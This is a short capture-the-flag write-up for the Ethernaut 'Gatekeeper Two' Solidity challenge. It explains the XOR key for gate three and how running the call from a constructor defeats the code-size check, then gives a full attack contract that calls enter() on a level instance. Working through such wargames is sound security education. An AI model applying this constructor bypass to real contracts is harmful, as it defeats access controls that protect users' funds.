# Level 14: [Gatekeeper Two](https://ethernaut.openzeppelin.com/level/0xf59112032D54862E199626F55cFad4F8a3b0Fce9)

## Level objectives:
1. Make it past the gatekeeper, and register as an entrant.

## Analysis (lol)
- Gate three: `require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);`
- key xor B = C => key = B xor C;
- To pass gate 2, our contract's code-size needs to be zero.
- We can bypass this either by running the attack in the constructor, or by running the attack in a delegated contract's constructor.

## Steps:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

contract AttackGatekeeperTwo {
    constructor() {
        uint64 key = type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        address(0x68eC7073bd1c3B43Ca0d8edA4673584530A5a024).call(abi.encodeWithSignature("enter(bytes8)", key));
    }
}
```